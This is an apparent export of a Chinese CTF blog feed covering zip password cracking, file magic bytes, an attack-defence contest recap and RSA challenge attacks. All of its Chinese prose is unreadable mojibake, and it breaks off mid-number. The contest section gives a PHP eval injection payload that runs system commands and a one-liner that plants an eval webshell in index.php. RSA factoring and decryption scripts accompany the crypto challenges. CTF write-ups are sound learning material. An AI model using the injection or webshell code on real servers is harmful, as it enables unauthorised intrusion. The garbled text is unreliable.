ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥è·‘å­—å…¸</p><pre><code># fcrackzip -D -p /å­—å…¸ä½ç½®/xxx.txt  -u crack_this.zip</code></pre><h3 id="å…³äºå›¾ç‰‡æ ¼å¼é—®é¢˜"><a href="#å…³äºå›¾ç‰‡æ ¼å¼é—®é¢˜" class="headerlink" title="å…³äºå›¾ç‰‡æ ¼å¼é—®é¢˜"></a>å…³äºå›¾ç‰‡æ ¼å¼é—®é¢˜</h3><p>pngæ–‡ä»¶ç½²ååŸŸ</p><ul><li>åè¿›åˆ¶æ•°ï¼š137 80 78 71 13 10 26 10</li><li>åå…­è¿›åˆ¶ï¼š89 50 4e 47 0d 0a 1a 0a</li></ul><h3 id="æ–‡ä»¶å¤´æ€»ç»“"><a href="#æ–‡ä»¶å¤´æ€»ç»“" class="headerlink" title="æ–‡ä»¶å¤´æ€»ç»“"></a>æ–‡ä»¶å¤´æ€»ç»“</h3><pre><code>JPEG (jpg)ï¼Œ                        ã€€ã€€æ–‡ä»¶å¤´ï¼šFFD8FFã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼šFF D9ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€PNG (png)ï¼Œ                       ã€€ã€€ æ–‡ä»¶å¤´ï¼š89504E47ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼šAE 42 60 82GIF (gif)ï¼Œ                           ã€€ã€€æ–‡ä»¶å¤´ï¼š47494638ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š00 3B                                                                 ZIP Archive (zip)ï¼Œ                     æ–‡ä»¶å¤´ï¼š504B0304ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š50 4BTIFF (tif)ï¼Œ                           ã€€  æ–‡ä»¶å¤´ï¼š49492A00ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼šWindows Bitmap (bmp)ï¼Œ      ã€€  æ–‡ä»¶å¤´ï¼š424Dã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼šCAD (dwg)ï¼Œ                        ã€€  æ–‡ä»¶å¤´ï¼š41433130ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼šAdobe Photoshop (psd)ï¼Œ          æ–‡ä»¶å¤´ï¼š38425053ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼šRich Text Format (rtf)ï¼Œ             æ–‡ä»¶å¤´ï¼š7B5C727466ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  æ–‡ä»¶å°¾ï¼šXML (xml)ï¼Œ                              æ–‡ä»¶å¤´ï¼š3C3F786D6Cã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼šHTML (html)ï¼Œ                           æ–‡ä»¶å¤´ï¼š68746D6C3EEmail [thorough only] (eml)ï¼Œ     æ–‡ä»¶å¤´ï¼š44656C69766572792D646174653AOutlook Express (dbx)ï¼Œ            æ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746FOutlook (pst)ï¼Œ                         æ–‡ä»¶å¤´ï¼š2142444EMS Word/Excel (xls.or.doc)ï¼Œ      æ–‡ä»¶å¤´ï¼šD0CF11E0MS Access (mdb)ï¼Œ                    æ–‡ä»¶å¤´ï¼š5374616E64617264204AWordPerfect (wpd)ï¼Œ                  æ–‡ä»¶å¤´ï¼šFF575043Adobe Acrobat (pdf)ï¼Œ               æ–‡ä»¶å¤´ï¼š255044462D312EQuicken (qdf)ï¼Œ                         æ–‡ä»¶å¤´ï¼šAC9EBD8FWindows Password (pwl)ï¼Œ         æ–‡ä»¶å¤´ï¼šE3828596RAR Archive (rar)ï¼Œ                    æ–‡ä»¶å¤´ï¼š52617221Wave (wav)ï¼Œ                            æ–‡ä»¶å¤´ï¼š57415645AVI (avi)ï¼Œ                                 æ–‡ä»¶å¤´ï¼š41564920Real Audio (ram)ï¼Œ                     æ–‡ä»¶å¤´ï¼š2E7261FDReal Media (rm)ï¼Œ                       æ–‡ä»¶å¤´ï¼š2E524D46MPEG (mpg)ï¼Œ                           æ–‡ä»¶å¤´ï¼š000001BAMPEG (mpg)ï¼Œ                           æ–‡ä»¶å¤´ï¼š000001B3Quicktime (mov)ï¼Œ                     æ–‡ä»¶å¤´ï¼š6D6F6F76Windows Media (asf)ï¼Œ               æ–‡ä»¶å¤´ï¼š3026B2758E66CF11MIDI (mid)ï¼Œ                              æ–‡ä»¶å¤´ï¼š4D546864</code></pre><h3 id="zipæ–‡ä»¶æ ¼å¼"><a href="#zipæ–‡ä»¶æ ¼å¼" class="headerlink" title="zipæ–‡ä»¶æ ¼å¼"></a>zipæ–‡ä»¶æ ¼å¼</h3><p>ç¿»è¯‘ä½œè€…çš„æ–‡ç« é“¾æ¥<br><a href="https://blog.csdn.net/luoye7422/article/details/41878969" target="_blank" rel="noopener">https://blog.csdn.net/luoye7422/article/details/41878969</a></p><p>å‚è€ƒé“¾æ¥</p><blockquote><p><a href="https://www.jianshu.com/p/4d8cace82028" title="å›¾ç‰‡æ ¼å¼è¯¦è§£" target="_blank" rel="noopener">https://www.jianshu.com/p/4d8cace82028</a><br>æ›´è¯¦ç»†è§£é‡Šï¼š<a href="https://blog.csdn.net/u012611878/article/details/52215985" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/52215985</a><br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" target="_blank" rel="noopener">https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zip </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 ISCCçº¿ä¸‹èµ›å›é¡¾</title>
      <link href="/2018/07/22/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%9B%9E%E9%A1%BE/"/>
      <url>/2018/07/22/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%9B%9E%E9%A1%BE/</url>
      
        <content type="html"><![CDATA[<p>ä¸æ¯”ä¸çŸ¥é“è‡ªå·±è·Ÿå¤§ä½¬å·®è·æœ‰å¤šå¤§ï¼å¼€å±€ç›´æ¥å…¨åœºè¢«å¤§ä½¬æŒ‚é»‘é¡µï¼Œç­‰ç€è¿ç»´å›å¤å‡ ä¸ªå°æ—¶ä¹‹åå¥½ä¸å®¹æ˜“æ‰¾åˆ°shellè·¯å¾„ï¼Œshellåˆè¢«å…¶ä»–å¤§ä½¬åˆ äº†â€¦çœŸæ˜¯èœå“­äº†ï¼Œä¸€ä¸‹åˆçš„æ¯”èµ›æ¯«æ— ä½œä¸ºâ€¦</p><a id="more"></a><h2 id="web1-ç§åœ°æ¸—é€"><a href="#web1-ç§åœ°æ¸—é€" class="headerlink" title="web1 ç§åœ°æ¸—é€"></a>web1 ç§åœ°æ¸—é€</h2><p>å…ˆæ˜¯æ³¨å†Œé¡µé¢æ‹¿åˆ°shellè·¯å¾„ï¼Œå…·ä½“æ“ä½œçœ‹SQLé‚£ç¯‡å§ã€‚</p><p>æ‹¿åˆ°è·¯å¾„ä¹‹åè®¿é—®ä¹‹åæ˜¯è¿™æ ·çš„</p><pre><code>&lt;?phpshow_source(__FILE__);$a=@$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);?&gt;</code></pre><p>å…ˆåˆ†æä¸€ä¸‹ä»£ç ï¼Œä¸»è¦å‡ ä¸ªå‡½æ•°</p><ul><li>show_source():æŸ¥çœ‹æ–‡ä»¶æºç </li><li>eval():æŠŠå­—ç¬¦ä¸²å½“åšphpä»£ç æ‰§è¡Œ</li><li>var_dump():æ‰“å°å˜é‡ä¿¡æ¯ï¼Œè¿”å›å€¼ä¸ºnull</li></ul><p>è¿™é‡Œæœ‰æ˜æ˜¾çš„å˜é‡å¼•ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶$açš„å€¼æ¥å‘½ä»¤æ‰§è¡Œã€‚</p><h3 id="phpä¸­å•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«"><a href="#phpä¸­å•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«" class="headerlink" title="phpä¸­å•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«"></a>phpä¸­å•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«</h3><pre><code>&lt;?php$c=&quot;Luc1fer!&quot;;echo &quot;My name is &quot;.$c.&quot;&lt;br&gt;&quot;;       //ä¸åŠ å¼•å·echo &quot;My name is &quot;.&apos;$c&apos;.&quot;&lt;br&gt;&quot;;        //å•å¼•å·echo &quot;My name is &quot;.&quot;$c&quot;.&quot;&lt;br&gt;&quot;;        //åŒå¼•å·echo &quot;My name is &quot;.&quot; &apos;$c&apos; &quot;.&quot;&lt;br&gt;&quot;;    //åŒå¼•å·+å•å¼•å·echo &quot;My name is &quot;.&apos; &quot;$c&quot; &apos;.&quot;&lt;br&gt;&quot;; //å•å¼•å·+åŒå¼•å·?&gt;</code></pre><p>è¾“å‡ºç»“æœå¦‚ä¸‹</p><pre><code>My name is Luc1fer!                    //æ­£å¸¸æ˜¾ç¤ºMy name is $c                        //å•å¼•å·ä¸è¢«è§£æMy name is Luc1fer!                    //åŒå¼•å·å†…æ­£å¸¸è§£æMy name is &apos;Luc1fer!&apos;                //åŒå¼•å·å†…æ­£å¸¸è§£æMy name is &quot;$c&quot;                     //å•å¼•å·å†…ä¸è¢«è§£æ</code></pre><h3 id="phpå˜é‡è¦†ç›–"><a href="#phpå˜é‡è¦†ç›–" class="headerlink" title="phpå˜é‡è¦†ç›–"></a>phpå˜é‡è¦†ç›–</h3><p>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?phpshow_source(__FILE__);$b=&quot;Hello,my name is Luc1fer!&quot;;$a=@$_REQUEST[&apos;a&apos;];echo $$a;?&gt;</code></pre><p>ç»“æœå¦‚ä¸‹ï¼š</p><pre><code> &lt;?phpshow_source(__FILE__);$b=&quot;Hello,my name is Luc1fer!&quot;;$a=@$_REQUEST[&apos;a&apos;];echo $$a;?&gt; Hello,my name is Luc1fer!</code></pre><p>ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹å¤§æ¦‚ä¸º  <code>getä¸€ä¸ªa--&gt;echoæ‰§è¡Œä»å³åˆ°å·¦--&gt;echo $$a--&gt;echo $b--&gt;æ‰“å°$b</code><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡?a=a=â€helloâ€è¿™æ ·çš„æ–¹å¼æ¥æ‰“å°hello</p><h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><p>å¯¹äºvar_dump()æˆ‘ä»¬å¯ä»¥æ„é€ å•å¼•å·ä½¿å…¶é—­åˆ</p><pre><code>&lt;?phpshow_source(__FILE__);$a=@$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);?&gt;http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>è¿™æ ·å°±å¯ä»¥æ‰“å°phpinfo()ä¿¡æ¯äº†</p><p>åŒæ ·çš„æˆ‘ä»¬å¯ä»¥cat flagäº†.</p><h2 id="ç§åœ°ä¸é«˜åœ°"><a href="#ç§åœ°ä¸é«˜åœ°" class="headerlink" title="ç§åœ°ä¸é«˜åœ°"></a>ç§åœ°ä¸é«˜åœ°</h2><h3 id="ä¸»è¦é—®é¢˜"><a href="#ä¸»è¦é—®é¢˜" class="headerlink" title="ä¸»è¦é—®é¢˜"></a>ä¸»è¦é—®é¢˜</h3><p>ç­‰æ‹¿åˆ°ç§åœ°æƒé™ä¹‹åå°±åªå‰©40å¤šåˆ†é’Ÿäº†ï¼ŒWINSCPæ­»æ´»è¿ä¸ä¸Šç§åœ°ï¼Œæ²¡åŠæ³•åƒå¾€å¸¸ä¸€æ ·downæºç ï¼Œä¸Šç›‘æ§ä¸Šwafï¼Œæœ‰ç‚¹æ‰‹å¿™è„šä¹±ï¼Œè¿™è¾¹Xshellè¿ä¸Šäº†ï¼ŒæŸ¥çœ‹wwwç›®å½•å‘ç°å…¨æ˜¯é©¬ï¼Œæ‰“å¼€å‡ ä¸ªæ‰‹åŠ¨æ³¨é‡Šäº†é©¬ï¼Œå…¶ä»–çš„éƒ½æ˜¯readonlyæ–‡ä»¶</p><ol><li>é¢å¯¹è¢«å†™ä¸Šçš„é©¬ï¼Œå¦‚æœæˆ‘æ˜¯ctfæƒé™ï¼Œä¸”æ–‡ä»¶readonlyè¯¥æ€ä¹ˆåˆ æ‰è¿™ä¸ªé©¬ï¼Ÿ</li></ol><p>èµ›åå’Œè€å¸ˆè®¨è®ºï¼Œè€å¸ˆè¯´è¿ä¸ä¸ŠWINSCPä¸ºä»€ä¹ˆä¸ç”¨wegtå‘½ä»¤ä¸‹æºç ï¼Ÿè¿™ä¸ªå½“æ—¶ç¡®å®æ²¡æƒ³åˆ°ï¼Œä¸‹æ¬¡è¦æ³¨æ„ã€‚è¿˜æœ‰æ²¡ä¸Šè„šæœ¬çš„é—®é¢˜ï¼ŒåŒå­¦æŒ‡å‡ºå¯ä»¥ç›´æ¥ç”¨vimæ‰“å¼€ä¹‹åå¤åˆ¶ç²˜è´´è¿›å»ç›‘æ§è„šæœ¬ï¼Œè¿™ä¸ªå½“æ—¶ç¡®å®æ‡µåœˆäº†ï¼Œåªåœ¨é‚£å‚»å‚»çš„æ‰‹å·¥æ³¨é‡Šã€‚</p><p>2.é¢å¯¹ä¸æ­»é©¬æˆ‘è¯¥æ€ä¹ˆå»åˆ æ‰è¿™ä¸ªä¸æ­»é©¬ï¼Ÿ</p><p>æ¯”èµ›å‰å‡†å¤‡çš„æ–¹æ³•æœ‰killè¿›ç¨‹ã€é‡å¯Apacheã€åˆ›å»ºåŒåæ–‡ä»¶ï¼Œè¿™äº›åœ¨è¿™æ¬¡æ¯”èµ›ä¸­éƒ½æ²¡æœ‰çœŸæ­£å®è·µåˆ°</p><p>3.å¦‚ä½•åœ¨æ‹¿åˆ°æƒé™ä¹‹åæ‰¹é‡ç»™åˆ«äººä¼ é©¬ï¼Ÿ</p><p>è¯´å®è¯æˆ‘è¿™ä¸ªåœ°æ–¹è¿˜æ˜¯æ²¡æ‡‚ï¼ŒæŒ‰ç†è¯´åº”è¯¥æ˜¯åˆ©ç”¨é¢„ç•™çš„åé—¨ç„¶åæ‰§è¡Œå†™å…¥å‘½ä»¤</p><pre><code>echo -e &quot;&lt;?php eval(\@_POST[&apos;a&apos;]);?&gt;&quot; &gt; index.php | chomod 777 index.php</code></pre><p>ä½†æ˜¯æ€ä¹ˆæ‰¹é‡å‘¢ï¼Ÿç”¨æ‰¹é‡æäº¤flagé‚£ä¸ªä¹ˆï¼Ÿè¿˜å¸¦å»é—®é—®å¸ˆå‚…</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å›é¡¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¯”èµ›å›é¡¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2018/05/23/RSA/"/>
      <url>/2018/05/23/RSA/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘æ‰äºŒåå‡ºå¤´ï¼Œä¸ºä»€ä¹ˆè¦æ‰¿å—è¿™ä¹ˆå¤šâ€¦</p><a id="more"></a><p>pubkey.pemæ–‡ä»¶æ„æˆ</p><p>Jarvis OJ mediumRSAä¸ºä¾‹</p><p>ä¸‹è½½æ–‡ä»¶æˆ‘ä»¬å¾—åˆ°äº†flag.encå’Œpubkey.pemï¼Œ<br>ä½¿ç”¨opensslæ¥è·å–å…¬é’¥ä¿¡æ¯</p><pre><code>root@kali-ctf:~/RSA/mediumRSA# openssl rsa -pubin -in pubkey.pem -text -modulusPublic-Key: (256 bit)Modulus:00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----</code></pre><p>è¿™é‡Œçš„Exponentï¼š65537(0x10001) å³ä¸ºe.</p><p>Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD å³ä¸ºN.</p><p>è¿™é‡Œé€šè¿‡çœ‹<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html" title="å¤§ä½¬åšå®¢" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html</a>ç®€å•è¯´ä¸€ä¸‹pemæ–‡ä»¶ç»„æˆã€‚</p><p>ç®€å•æ¥è®²ï¼Œpemæ–‡ä»¶å°±æ˜¯ç”¨äºASCII(Base64)ç¼–ç çš„å„ç§X.509 v3è¯ä¹¦ã€‚</p><p>æ–‡ä»¶ç”±BEGINå¼€å§‹ï¼ŒENDç»“æŸã€‚æ–‡ä»¶å†…å®¹è¦æ ¹æ®base64ç¼–ç è§£ç ä¹‹åï¼Œå¾—åˆ°çš„æ•°æ®è¿›è¡Œå¢åŠ æˆ–åˆ å‡ç‰¹æ®Šå­—ç¬¦ç­‰ã€‚</p><p>æ¥ç€ä¸Šé¢çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†n,eï¼Œæ¥ç€å»factoråˆ†è§£Nå¾—åˆ°p,qï¼Œç”Ÿæˆç§é’¥åè§£å¯†flag.encæ–‡ä»¶ã€‚</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-import gmpy2from Crypto.Util.number import long_to_bytesp = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = 87924348264132406875276140514499937145050893665602592992418171647042491658461e = 65537d = gmpy2.invert(e, (p - 1) * (q - 1))with open(&apos;flag.enc&apos;, &apos;r&apos;) as f:        c = f.read().encode(&apos;hex&apos;)        c = int(c, 16)m = pow(c, d, n)print long_to_bytes(m)</code></pre><p>è¿™é‡Œå†è¯´ä¸€ä¸‹openssl</p><ul><li><p>æŸ¥çœ‹å…¬é’¥æ–‡ä»¶ </p></li><li><p>  openssl rsa -pubin -in pubkey.pem -text -modulus</p></li><li><p>è§£å¯†</p></li><li><p><code>rsautl -decrypt -inkey private.pem -in flag.enc -out flag</code></p></li></ul><h2 id="æ¨¡æ•°ç›¸å…³æ”»å‡»"><a href="#æ¨¡æ•°ç›¸å…³æ”»å‡»" class="headerlink" title="æ¨¡æ•°ç›¸å…³æ”»å‡»"></a>æ¨¡æ•°ç›¸å…³æ”»å‡»</h2><h3 id="dæ³„éœ²æ”»å‡»"><a href="#dæ³„éœ²æ”»å‡»" class="headerlink" title="dæ³„éœ²æ”»å‡»"></a>dæ³„éœ²æ”»å‡»</h3><p><a href="http://www.ams.org/notices/199902/boneh.pdf" title="åŸç†çœ‹è¿™ç¯‡paper" target="_blank" rel="noopener">http://www.ams.org/notices/199902/boneh.pdf</a> </p><p>é¢˜ç›®å‚è€ƒè¥¿æ¹–è®ºå‰‘çº¿ä¸‹èµ›RSA</p><p>chall.py</p><pre><code>    from gmpy2 import invertfrom md5 import md5from secret import p, qe = 65537n = p*qphi = (p-1)*(q-1)d = invert(e, phi)print n, e, dprint &quot;Flag: flag{%s}&quot; %md5(str(p + q)).hexdigest()</code></pre><p>output</p><pre><code>n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309e= 65537 d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453Flag: flag{xxxx}</code></pre><p>d æ³„éœ²ä¹‹åæˆ‘ä»¬å¯ä»¥è§£å¯†æ‰€æœ‰åŠ å¯†çš„æ¶ˆæ¯ï¼Œè¿˜å¯ä»¥å¯¹æ¨¡æ•°è¿›è¡Œåˆ†è§£ï¼Œè„šæœ¬å¦‚ä¸‹</p><pre><code>import randomdef gcd(a, b):if a &lt; b:    a, b = b, awhile b != 0:    temp = a % b    a = b    b = tempreturn adef getpq(n,e,d):p = 1q = 1while p==1 and q==1:    k = d * e - 1    g = random.randint ( 0 , n )    while p==1 and q==1 and k % 2 == 0:        k /= 2        y = pow(g,k,n)        if y!=1 and gcd(y-1,n)&gt;1:            p = gcd(y-1,n)            q = n/pprint p,qdef main():n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309e=65537d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453getpq(n,e,d)if __name__ == &apos;__main__&apos;:main()</code></pre><h3 id="Wienerâ€™s-Attack"><a href="#Wienerâ€™s-Attack" class="headerlink" title="Wienerâ€™s Attack"></a>Wienerâ€™s Attack</h3><p>å½“dæ¯”è¾ƒå°æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¯¥æ”»å‡»è·å–ç§é’¥ã€‚</p><pre><code>#coding:utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5import base64flag=raw_input(&apos;flag:&apos;)key=RSA.construct((1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049L, 837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347L))cipher = Cipher_pkcs1_v1_5.new(key)cipher_text = base64.b64encode(cipher.encrypt(flag))print cipher_text#cipher_text = &apos;AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q&apos;</code></pre><p>N,eéƒ½å¾ˆå¤§ï¼Œä½¿ç”¨è„šæœ¬æ”»å‡»<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p><h3 id="æ¨¡ä¸äº’ç´ "><a href="#æ¨¡ä¸äº’ç´ " class="headerlink" title="æ¨¡ä¸äº’ç´ "></a>æ¨¡ä¸äº’ç´ </h3><p>2019å¼ºç½‘æ¯åæ¥çš„qwxfé¢˜</p><pre><code>flag=open(&quot;flag&quot;,&quot;rb&quot;).read()from Crypto.Util.number import getPrime,bytes_to_longp=getPrime(1024)q=getPrime(1024)e=65537n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,np=getPrime(1024)e=65537n=p*qm=bytes_to_long(&quot;1&quot;*32)c=pow(m,e,n)print c,e,noutput:2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597 65537 1496703005997511495029539987418504705373658788012799054203576520142577934243066251776506325878468586810706678947574718024471135264646977673293854464158384231379187298635750446218492407522743349863142328918798835147566678519085421038958759497545606498461199046112668430108624153291526731167516419021347424531101962365486593785165353287096542347455534823985802155158965016960243942384116069879333811520423814008573868088331343357406024360002850060082462435847340305959759389141217939916581362251290126338029956101962474148877936701938977578654729206535288500722423958177697589238536444644618564293913728751994597480772738290600395720427374966791868810679503289561331636299088723481081601295504376976771505994839239257982243281755944832179388335202200872303034701385259704689155111113203961854825647839754353463544400357769097811584076360449864038198406483796096300393488954150457232088436311912521426006676078074799541944472370610806183707876727203447414135379759221848593334321977665801505344570011967656216786599521080105962732442308123271827863297608440371497195872696321335951492940674909556448934027087202841797150021492240689288286565153264468817912286380085728893315119450429113729150038055054120991029540732990109518969553624706553714624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</code></pre><p>è¿™é‡Œçš„Nå¤§åˆ°æ²¡æ³•åˆ†è§£ï¼Œä½†æ˜¯ä¸¤ä¸ªNæœ‰å…¬å› æ•°ï¼Œå°±æ˜¯pï¼Œé€šè¿‡æ±‚æœ€å¤§å…¬å› æ•°å¾—åˆ°p</p><pre><code>def gcd(a, b):if a &lt; b:    a, b = b, awhile b != 0:    temp = a % b    #print temp    a = b    b = tempreturn a</code></pre><p>ä¹‹åä¹Ÿæ˜¯å¸¸è§„è§£å¯†</p><p>å†æ¥ä¸ªç½‘ä¸Šæ‰¾çš„å…¨å¥—çš„</p><pre><code>#  coding: utf-8from Crypto.PublicKey import RSAimport gmpy2import codecsn1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560c2=994646892011925259699821365693134857594498585662975442933020912153414524511956187851399506658981703689929953309375123714496032875920885573247485379471134720386515636007877213279043159481168258192672205754668343787315910788565284230473